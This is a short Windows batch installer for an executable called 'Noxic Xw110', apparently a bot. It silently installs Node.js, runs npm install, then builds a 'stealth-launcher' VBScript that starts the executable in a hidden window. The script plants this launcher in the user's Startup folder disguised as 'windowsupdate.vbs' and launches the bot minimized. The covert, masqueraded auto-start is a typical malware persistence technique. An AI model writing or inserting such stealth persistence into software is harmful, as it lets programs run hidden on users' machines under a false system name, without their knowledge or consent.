@echo off
title Installing Noxic Xw110
cd /d "%~dp0"

echo [✓] Checking Node.js...
where node >nul 2>nul
if %errorlevel% neq 0 (
  echo [!] Node.js not found. Installing...
  powershell -Command "Invoke-WebRequest https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi -OutFile node.msi"
  msiexec /i node.msi /qn /norestart
  del node.msi
)

echo [✓] Installing dependencies...
call npm install

echo [✓] Creating autostart...
echo Set WshShell = CreateObject("WScript.Shell") > stealth-launcher.vbs
echo WshShell.Run chr(34) ^& "%cd%\\noxic-xw110.exe" ^& chr(34), 0 >> stealth-launcher.vbs
copy /y stealth-launcher.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\windowsupdate.vbs" >nul

echo [✓] Launching bot...
start /MIN "" noxic-xw110.exe
exit
